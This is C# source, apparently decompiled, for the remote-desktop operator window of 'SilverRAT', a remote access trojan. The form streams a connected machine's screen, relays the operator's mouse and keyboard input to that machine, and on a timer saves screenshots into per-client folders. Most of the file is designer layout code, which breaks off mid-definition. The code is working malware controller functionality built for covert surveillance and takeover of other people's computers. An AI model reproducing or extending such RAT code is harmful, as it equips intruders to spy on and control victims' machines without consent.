using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using SilverRAT.StreamLibrary;
using SilverRAT.StreamLibrary.UnsafeCodecs;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class RemoteDesktop : Form
{
    public int FPS = 0;

    public Stopwatch sw = Stopwatch.StartNew();

    public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

    public Size rdSize;

    public object syncPicbox = new object();

    private readonly List<Keys> _keysPressed;

    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    private Panel panelForm;

    private BunifuPanel PanelTitle;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private Guna2ResizeBox FormResizeBox1;

    private Panel panel1;

    public PictureBox ViewerBox;

    private Panel PanelMune;

    private Label MuneClose;

    internal Guna2HtmlLabel ValueQuality;

    private BunifuLabel bunifuLabel17;

    public Guna2GradientButton Power;

    private Guna2GradientButton ButtonMune;

    internal Guna2HtmlLabel guna2HtmlLabel1;

    public Bunifu.UI.WinForms.BunifuDropdown AllScreens;

    private Label WindowActiveTxt;

    private BunifuRadioButton WindowActive;

    private Label FullScreenTxt;

    private BunifuRadioButton FullScreen;

    private BunifuCheckBox CaptureSave;

    private Label TxCaptureSave;

    private BunifuCheckBox EnabledKeyboard;

    private Label TxKeyboard;

    private BunifuCheckBox EnabledMouse;

    private Label TxMouse;

    public BunifuLoader LoaderConnect;

    public System.Windows.Forms.Timer Timer1;

    public Guna2TrackBar QualityTrackBar;

    private BunifuCheckBox EnabledResize;

    private Label TxDelay;

    public BunifuLabel logs;

    public BunifuTextBox ScreenY;

    public BunifuTextBox ScreenX;

    public BunifuLabel SizeScreen;

    private System.Windows.Forms.Timer TimerSave;

    public PictureBox WaitRDP;

    private Panel PanelTypeScreen;

    private BunifuCheckBox bunifuCheckBox_0;

    private Label label1;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public string ScreenPath { get; set; }

    public string FullPath { get; set; }

    public Image GetImage { get; set; }

    public RemoteDesktop()
    {
        _keysPressed = new List<Keys>();
        InitializeComponent();
        MinimumSize = base.Size;
    }

    private void RemoteDesktop_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            string[] array = userIDClient.Split('\\');
            ScreenPath = Path.Combine(Application.StartupPath, "Clients", "RemoteDesktop\\" + array[0] + "_" + array[1]);
            if (!Directory.Exists(ScreenPath))
            {
                Directory.CreateDirectory(ScreenPath);
                FullPath = ScreenPath;
            }
            else
            {
                FullPath = ScreenPath;
            }
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void ButtonMune_Click(object sender, EventArgs e)
    {
        if (!PanelMune.Visible)
        {
            Program.Silver.TransitionShowng.ShowSync(PanelMune);
        }
    }

    private void MuneClose_Click(object sender, EventArgs e)
    {
        Program.Silver.TransitionHiddeng.HideSync(PanelMune);
    }

    private void QualityTrackBar_Scroll(object sender, ScrollEventArgs e)
    {
        ValueQuality.Text = QualityTrackBar.Value + "% Quality";
    }

    private void RemoteDesktop_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void RemoteDesktop_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
        {
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
            Close();
        }
    }

    private void ViewerBox_MouseDown(object sender, MouseEventArgs e)
    {
        try
        {
            if (FullScreen.Checked && Power.Text == "Stop" && ViewerBox.Image != null && EnabledMouse.Checked)
            {
                Point point = new Point(e.X * rdSize.Width / ImageLogo.Width, e.Y * rdSize.Height / ImageLogo.Height);
                int num = 0;
                if (e.Button == MouseButtons.Left)
                {
                    num = 2;
                }
                if (e.Button == MouseButtons.Right)
                {
                    num = 8;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "mouseClick";
                msgPack.ForcePathObject("X").AsInteger = point.X;
                msgPack.ForcePathObject("Y").AsInteger = point.Y;
                msgPack.ForcePathObject("Button").AsInteger = num;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void ViewerBox_MouseMove(object sender, MouseEventArgs e)
    {
        try
        {
            if (FullScreen.Checked && Power.Text == "Stop" && ViewerBox.Image != null && EnabledMouse.Checked)
            {
                Point point = new Point(e.X * rdSize.Width / ImageLogo.Width, e.Y * rdSize.Height / ImageLogo.Height);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "mouseMove";
                msgPack.ForcePathObject("X").AsInteger = point.X;
                msgPack.ForcePathObject("Y").AsInteger = point.Y;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void ViewerBox_MouseUp(object sender, MouseEventArgs e)
    {
        try
        {
            if (FullScreen.Checked && Power.Text == "Stop" && ViewerBox.Image != null && EnabledMouse.Checked)
            {
                Point point = new Point(e.X * rdSize.Width / ImageLogo.Width, e.Y * rdSize.Height / ImageLogo.Height);
                int num = 0;
                if (e.Button == MouseButtons.Left)
                {
                    num = 4;
                }
                if (e.Button == MouseButtons.Right)
                {
                    num = 16;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "mouseClick";
                msgPack.ForcePathObject("X").AsInteger = point.X;
                msgPack.ForcePathObject("Y").AsInteger = point.Y;
                msgPack.ForcePathObject("Button").AsInteger = num;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            }
        }
        catch
        {
        }
    }

    private void RemoteDesktop_KeyUp(object sender, KeyEventArgs e)
    {
        if (FullScreen.Checked && Power.Text == "Stop" && ViewerBox.Image != null && ViewerBox.ContainsFocus && EnabledKeyboard.Checked)
        {
            if (!IsLockKey(e.KeyCode))
            {
                e.Handled = true;
            }
            _keysPressed.Remove(e.KeyCode);
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "keyboardClick";
            msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
            msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: false);
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
        }
    }

    private bool IsLockKey(Keys key)
    {
        return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
    }

    private void EnabledMouse_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        ViewerBox.Focus();
    }

    private void EnabledKeyboard_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        ViewerBox.Focus();
    }

    private void Power_Click(object sender, EventArgs e)
    {
        try
        {
            if (Power.Text == "Start")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "Start";
                msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(QualityTrackBar.Value.ToString());
                msgPack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(AllScreens.SelectedIndex.ToString());
                msgPack.ForcePathObject("X").AsInteger = Convert.ToInt32(ScreenX.Text.ToString());
                msgPack.ForcePathObject("Y").AsInteger = Convert.ToInt32(ScreenY.Text.ToString());
                msgPack.ForcePathObject("IsAciveWindow").AsString = WindowActive.Checked.ToString();
                msgPack.ForcePathObject("Resize").AsString = EnabledResize.Checked.ToString();
                decoder = new UnsafeStreamCodec(Convert.ToInt32(QualityTrackBar.Value));
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                AllScreens.Enabled = false;
                PanelTypeScreen.Enabled = false;
                QualityTrackBar.Enabled = false;
                EnabledResize.Enabled = false;
                ScreenX.Enabled = false;
                ScreenY.Enabled = false;
                Power.Text = "Started...";
                Power.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "Stop";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                AllScreens.Enabled = true;
                PanelTypeScreen.Enabled = true;
                QualityTrackBar.Enabled = true;
                EnabledResize.Enabled = true;
                ScreenX.Enabled = true;
                ScreenY.Enabled = true;
                Power.Text = "Stoped...";
                Power.Enabled = false;
            }
        }
        catch
        {
        }
    }

    private void EnabledResize_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (EnabledResize.Checked)
        {
            ScreenX.Enabled = true;
            ScreenY.Enabled = true;
        }
        else
        {
            ScreenX.Enabled = false;
            ScreenY.Enabled = false;
        }
    }

    private void TimerSave_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            Encoder quality = Encoder.Quality;
            EncoderParameters encoderParameters = new EncoderParameters(1);
            EncoderParameter encoderParameter = new EncoderParameter(quality, 50);
            encoderParameters.Param[0] = encoderParameter;
            ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
            ViewerBox.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
            encoderParameters?.Dispose();
            encoderParameter?.Dispose();
        }
        catch
        {
        }
    }

    private void CaptureSave_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (!CaptureSave.Checked || !(Power.Text == "Stop"))
        {
            return;
        }
        if (TimerSave.Enabled)
        {
            TimerSave.Stop();
            return;
        }
        TimerSave.Start();
        try
        {
            if (!Directory.Exists(FullPath))
            {
                Directory.CreateDirectory(FullPath);
            }
            Process.Start(FullPath);
        }
        catch
        {
        }
    }

    private ImageCodecInfo GetEncoder(ImageFormat format)
    {
        ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
        ImageCodecInfo[] array = imageDecoders;
        int num = 0;
        ImageCodecInfo imageCodecInfo;
        while (true)
        {
            if (num < array.Length)
            {
                imageCodecInfo = array[num];
                if (imageCodecInfo.FormatID == format.Guid)
                {
                    break;
                }
                num++;
                continue;
            }
            return null;
        }
        return imageCodecInfo;
    }

    private void EnbledFPS_CheckedChanged(object sender, BunifuCheckBox.CheckedChangedEventArgs e)
    {
        if (bunifuCheckBox_0.Checked)
        {
            logs.Visible = false;
        }
        else
        {
            logs.Visible = true;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.RemoteDesktop));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.logs = new Bunifu.UI.WinForms.BunifuLabel();
        this.panel1 = new System.Windows.Forms.Panel();
        this.WaitRDP = new System.Windows.Forms.PictureBox();
        this.PanelMune = new System.Windows.Forms.Panel();
        this.bunifuCheckBox_0 = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.label1 = new System.Windows.Forms.Label();
        this.PanelTypeScreen = new System.Windows.Forms.Panel();
        this.FullScreenTxt = new System.Windows.Forms.Label();
        this.FullScreen = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.WindowActive = new Bunifu.UI.WinForms.BunifuRadioButton();
        this.WindowActiveTxt = new System.Windows.Forms.Label();
        this.SizeScreen = new Bunifu.UI.WinForms.BunifuLabel();
        this.ScreenY = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ScreenX = new Bunifu.UI.WinForms.BunifuTextBox();
        this.EnabledResize = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxDelay = new System.Windows.Forms.Label();
        this.CaptureSave = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxCaptureSave = new System.Windows.Forms.Label();
        this.EnabledKeyboard = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxKeyboard = new System.Windows.Forms.Label();
        this.EnabledMouse = new Bunifu.UI.WinForms.BunifuCheckBox();
        this.TxMouse = new System.Windows.Forms.Label();
        this.guna2HtmlLabel1 = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.AllScreens = new Bunifu.UI.WinForms.BunifuDropdown();
        this.MuneClose = new System.Windows.Forms.Label();
        this.ValueQuality = new Guna.UI2.WinForms.Guna2HtmlLabel();
        this.QualityTrackBar = new Guna.UI2.WinForms.Guna2TrackBar();
        this.bunifuLabel17 = new Bunifu.UI.WinForms.BunifuLabel();
        this.Power = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ViewerBox = new System.Windows.Forms.PictureBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.ButtonMune = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.TimerSave = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.panel1.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.WaitRDP).BeginInit();
        this.PanelMune.SuspendLayout();
        this.PanelTypeScreen.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ViewerBox).BeginInit();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.logs);
        this.panelForm.Controls.Add(this.panel1);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(592, 489);
        this.panelForm.TabIndex = 571;
        this.panelForm.Visible = false;
        this.logs.AllowParentOverrides = false;
        this.logs.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.logs.AutoEllipsis = false;
        this.logs.AutoSize = false;
        this.logs.Cursor = System.Windows.Forms.Cursors.Default;
        this.logs.CursorType = System.Windows.Forms.Cursors.Default;
        this.logs.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.logs.ForeColor = System.Drawing.Color.DarkGray;
        this.logs.Location = new System.Drawing.Point(16, 466);
        this.logs.Name = "logs";
        this.logs.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.logs.Size = new System.Drawing.Size(148, 15);
        this.logs.TabIndex = 602;
        this.logs.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.logs.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.logs.Visible = false;
        this.panel1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panel1.Controls.Add(this.WaitRDP);
        this.panel1.Controls.Add(this.PanelMune);
        this.panel1.Controls.Add(this.ViewerBox);
        this.panel1.Location = new System.Drawing.Point(16, 112);
        this.panel1.Name = "panel1";
        this.panel1.Size = new System.Drawing.Size(562, 348);
        this.panel1.TabIndex = 601;
        this.WaitRDP.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.WaitRDP.BackColor = System.Drawing.Color.Black;
        this.WaitRDP.Image = (System.Drawing.Image)resources.GetObject("WaitRDP.Image");
        this.WaitRDP.Location = new System.Drawing.Point(205, 147);
        this.WaitRDP.Name = "WaitRDP";
        this.WaitRDP.Size = new System.Drawing.Size(100, 50);
        this.WaitRDP.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.WaitRDP.TabIndex = 579;
        this.WaitRDP.TabStop = false;
        this.PanelMune.Controls.Add(this.bunifuCheckBox_0);
        this.PanelMune.Controls.Add(this.label1);
        this.PanelMune.Controls.Add(this.PanelTypeScreen);
        this.PanelMune.Controls.Add(this.SizeScreen);
        this.PanelMune.Controls.Add(this.ScreenY);
        this.PanelMune.Controls.Add(this.ScreenX);
        this.PanelMune.Controls.Add(this.EnabledResize);
        this.PanelMune.Controls.Add(this.TxDelay);
        this.PanelMune.Controls.Add(this.CaptureSave);
        this.PanelMune.Controls.Add(this.TxCaptureSave);
        this.PanelMune.Controls.Add(this.EnabledKeyboard);
        this.PanelMune.Controls.Add(this.TxKeyboard);
        this.PanelMune.Controls.Add(this.EnabledMouse);
        this.PanelMune.Controls.Add(this.TxMouse);
        this.PanelMune.Controls.Add(this.guna2HtmlLabel1);
        this.PanelMune.Controls.Add(this.AllScreens);
        this.PanelMune.Controls.Add(this.MuneClose);
        this.PanelMune.Controls.Add(this.ValueQuality);
        this.PanelMune.Controls.Add(this.QualityTrackBar);
        this.PanelMune.Controls.Add(this.bunifuLabel17);
        this.PanelMune.Controls.Add(this.Power);
        this.PanelMune.Dock = System.Windows.Forms.DockStyle.Right;
        this.PanelMune.Location = new System.Drawing.Point(308, 0);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(254, 348);
        this.PanelMune.TabIndex = 578;
        this.bunifuCheckBox_0.AllowBindingControlAnimation = true;
        this.bunifuCheckBox_0.AllowBindingControlColorChanges = false;
        this.bunifuCheckBox_0.AllowBindingControlLocation = true;
        this.bunifuCheckBox_0.AllowCheckBoxAnimation = true;
        this.bunifuCheckBox_0.AllowCheckmarkAnimation = true;
        this.bunifuCheckBox_0.AllowOnHoverStates = true;
        this.bunifuCheckBox_0.AutoCheck = true;
        this.bunifuCheckBox_0.BackColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.BackgroundImage = (System.Drawing.Image)resources.GetObject("EnbledFPS.BackgroundImage");
        this.bunifuCheckBox_0.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
        this.bunifuCheckBox_0.BindingControl = this.label1;
        this.bunifuCheckBox_0.BindingControlPosition = Bunifu.UI.WinForms.BunifuCheckBox.BindingControlPositions.Right;
        this.bunifuCheckBox_0.BorderRadius = 6;
        this.bunifuCheckBox_0.Checked = true;
        this.bunifuCheckBox_0.CheckState = Bunifu.UI.WinForms.BunifuCheckBox.CheckStates.Checked;
        this.bunifuCheckBox_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.bunifuCheckBox_0.CustomCheckmarkImage = null;
        this.bunifuCheckBox_0.Location = new System.Drawing.Point(16, 311);
        this.bunifuCheckBox_0.MinimumSize = new System.Drawing.Size(17, 17);
        this.bunifuCheckBox_0.Name = "EnbledFPS";
        this.bunifuCheckBox_0.OnCheck.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnCheck.BorderThickness = 2;
        this.bunifuCheckBox_0.OnCheck.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnCheck.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnCheck.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnDisable.BorderColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.BorderRadius = 6;
        this.bunifuCheckBox_0.OnDisable.BorderThickness = 2;
        this.bunifuCheckBox_0.OnDisable.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnDisable.CheckmarkColor = System.Drawing.Color.LightGray;
        this.bunifuCheckBox_0.OnDisable.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverChecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverChecked.BorderThickness = 2;
        this.bunifuCheckBox_0.OnHoverChecked.CheckBoxColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.OnHoverChecked.CheckmarkThickness = 2;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderRadius = 6;
        this.bunifuCheckBox_0.OnHoverUnchecked.BorderThickness = 1;
        this.bunifuCheckBox_0.OnHoverUnchecked.CheckBoxColor = System.Drawing.Color.Transparent;
        this.bunifuCheckBox_0.OnUncheck.BorderColor = System.Drawing.Color.DarkGray;
        this.bunifuCheckBox_0.OnUncheck.BorderRadius = 6;
        this.bunifuCheckBox_0.OnUncheck.BorderThickness = 1;
        this.bunifuCheckBox_0.OnUncheck.CheckBoxColor = System.Drawing.Color.White;
        this.bunifuCheckBox_0.Size = new System.Drawing.Size(21, 21);
        this.bunifuCheckBox_0.Style = Bunifu.UI.WinForms.BunifuCheckBox.CheckBoxStyles.Bunifu;
        this.bunifuCheckBox_0.TabIndex = 662;
        this.bunifuCheckBox_0.ThreeState = false;
        this.bunifuCheckBox_0.ToolTipText = null;
        this.bunifuCheckBox_0.CheckedChanged += new System.EventHandler<Bunifu.UI.WinForms.BunifuCheckBox.CheckedChangedEventArgs>(EnbledFPS_CheckedChanged);
        this.label1.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.label1.AutoSize = true;
        this.label1.BackColor = System.Drawing.Color.Transparent;
        this.label1.Cursor = System.Windows.Forms.Cursors.Hand;
        this.label1.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.label1.ForeColor = System.Drawing.Color.Black;
        this.label1.Location = new System.Drawing.Point(40, 315);
        this.label1.Name = "label1";
        this.label1.Size = new System.Drawing.Size(91, 15);
        this.label1.TabIndex = 661;
        this.label1.Text = "FPS info Disable";
        this.PanelTypeScreen.Controls.Add(this.FullScreenTxt);
        this.PanelTypeScreen.Controls.Add(this.FullScreen);
        this.PanelTypeScreen.Controls.Add(this.WindowActive);
        this.PanelTypeScreen.Controls.Add(this.WindowActiveTxt);
        this.PanelTypeScreen.Location = new System.Drawing.Point(8, 78);
        this.PanelTypeScreen.Name = "PanelTypeScreen";
        this.PanelTypeScreen.Size = new System.Drawing.Size(236, 29);
        this.PanelTypeScreen.TabIndex = 660;
        this.FullScreenTxt.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.FullScreenTxt.AutoSize = true;
        this.FullScreenTxt.BackColor = System.Drawing.Color.Transparent;
        this.FullScreenTxt.Cursor = System.Windows.Forms.Cursors.Hand;
        this.FullScreenTxt.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.FullScreenTxt.ForeColor = System.Drawing.Color.Black;
        this.FullScreenTxt.Location = new System.Drawing.Point(32, 7);
        this.FullScreenTxt.Name = "FullScreenTxt";
        this.FullScreenTxt.Size = new System.Drawing.Size(64, 15);
        this.FullScreenTxt.TabIndex = 647;
        this.FullScreenTxt.Text = "Full Screen";
        this.FullScreen.AllowBindingControlLocation = false;
        this.FullScreen.BackColor = System.Drawing.Color.Transparent;
        this.FullScreen.BindingControl = this.FullScreenTxt;
        this.FullScreen.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.FullScreen.BorderThickness = 1;
        this.FullScreen.Checked = false;
        this.FullScreen.Cursor = System.Windows.Forms.Cursors.Hand;
        this.FullScreen.Location = new System.Drawing.Point(8, 5);
        this.FullScreen.Name = "FullScreen";
        this.FullScreen.OutlineColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.FullScreen.OutlineColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.FullScreen.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.FullScreen.RadioColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.FullScreen.RadioColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.FullScreen.Size = new System.Drawing.Size(21, 21);
        this.FullScreen.TabIndex = 646;
        this.FullScreen.Text = null;
        this.WindowActive.AllowBindingControlLocation = false;
        this.WindowActive.BackColor = System.Drawing.Color.Transparent;
        this.WindowActive.BindingControl = this.WindowActiveTxt;
        this.WindowActive.BindingControlPosition = Bunifu.UI.WinForms.BunifuRadioButton.BindingControlPositions.Right;
        this.WindowActive.BorderThickness = 1;
        this.WindowActive.Checked = true;
        this.WindowActive.Cursor = System.Windows.Forms.Cursors.Hand;
        this.WindowActive.Location = new System.Drawing.Point(102, 5);
        this.WindowActive.Name = "WindowActive";
        this.WindowActive.OutlineColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WindowActive.OutlineColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.WindowActive.OutlineColorUnchecked = System.Drawing.Color.DarkGray;
        this.WindowActive.RadioColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.WindowActive.RadioColorTabFocused = System.Drawing.Color.FromArgb(255, 192, 128);
        this.WindowActive.Size = new System.Drawing.Size(21, 21);
        this.WindowActive.TabIndex = 648;
        this.WindowActive.Text = null;
        this.WindowActiveTxt.AccessibleRole = System.Windows.Forms.AccessibleRole.CheckButton;
        this.WindowActiveTxt.AutoSize = true;
        this.WindowActiveTxt.BackColor = System.Drawing.Color.Transparent;
